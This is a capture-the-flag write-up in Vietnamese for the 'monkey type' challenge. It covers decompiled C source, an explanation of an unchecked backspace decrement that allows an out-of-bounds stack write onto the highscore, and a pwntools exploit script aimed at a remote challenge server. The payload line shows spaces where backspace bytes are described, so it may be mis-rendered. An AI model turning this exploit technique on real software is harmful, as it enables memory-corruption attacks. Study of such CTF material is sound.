# monkey type

## Source

<details> <summary> Source </summary>

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  char ch_0; // [rsp+3h] [rbp-9Dh]
  int idx; // [rsp+4h] [rbp-9Ch]
  uint64_t highscore; // [rsp+8h] [rbp-98h]
  WINDOW *mainwin; // [rsp+10h] [rbp-90h]
  timespec start; // [rsp+20h] [rbp-80h] BYREF
  timespec stop; // [rsp+30h] [rbp-70h] BYREF
  struct timespec remaining; // [rsp+40h] [rbp-60h] BYREF
  char buf[64]; // [rsp+50h] [rbp-50h] BYREF
  unsigned __int64 v13; // [rsp+98h] [rbp-8h]

  v13 = __readfsqword(0x28u);
  idx = 0;
  highscore = 0LL;
  mainwin = init();
  memset(buf, 0, sizeof(buf));
  update_cursor(0);
  nodelay(stdscr__NCURSES6_TINFO_5_0_19991023, 1);
  while ( ch_0 != 113 )
  {
    if ( highscore > 0xFFFFFFFF )
    {
      endwin();
      puts("You win! Here's the flag:");
      puts("grey{XXXXXXXXXXXXXXX}");
      exit(0);
    }
    ch_0 = wgetch(stdscr__NCURSES6_TINFO_5_0_19991023);
    if ( ch_0 != -1 )
    {
      if ( ch_0 == 0x7F )
      {
        update_text(mainwin, buf, --idx);
      }
      else if ( ch_0 > 0x1F )
      {
        if ( !idx )
          clock_gettime(0, &start);
        if ( idx <= 0x20 )
        {
          v3 = idx++;
          buf[v3] = ch_0;
          update_text(mainwin, buf, idx);
        }
        if ( !strcmp(buf, quote) )
        {
          clock_gettime(0, &stop);
          highscore = get_score(&start, &stop);
          update_highscore(mainwin, highscore);
          memset(buf, 0, sizeof(buf));
          idx = 0;
          update_text(mainwin, buf, 0);
          update_cursor(0);
        }
      }
    }
    remaining.tv_sec = 0LL;
    remaining.tv_nsec = 16666666LL;
    nanosleep(0LL, &remaining);
  }
  return 0;
}
```

</details>

## Ý tưởng

- wu tham khảo [link ở đây](https://gerrardtai.com/coding/greyctf#monkeytype)

- Đầu tiên, chương trình sẽ cho ta flag khi `highscore > 0xffffffff`
- Trong vòng lặp ta thấy chương trình đang xử lí các kí tự ta nhập vào, ở đây

```c
if ( ch_0 == 0x7F )
      {
        update_text(mainwin, buf, --idx);
      }
```

- khi `ch_0 == 0x7F` chương trình sẽ giảm idx xuống mà không kiểm tra giá trị idx có lớn hơn 0 không, chức năng update_text sẽ ghi lên stack, vậy ta có lỗi Out-of-bound

## Khai thác

```
char buf[64]; // [rsp+50h] [rbp-50h] BYREF
uint64_t highscore; // [rsp+8h] [rbp-98h]
```

```python
#!/usr/bin/python3

from pwn import *

exe = ELF('monkeytype', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''


                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('34.124.157.94', 12321)
else:
        p = process(exe.path)

GDB()
s(b' '*0x48)    # 0x98 - 0x50
s(b'A'*5)
# output = p.recvall()
# print(output[output.index(b'flag:\n'):])
p.interactive()
```
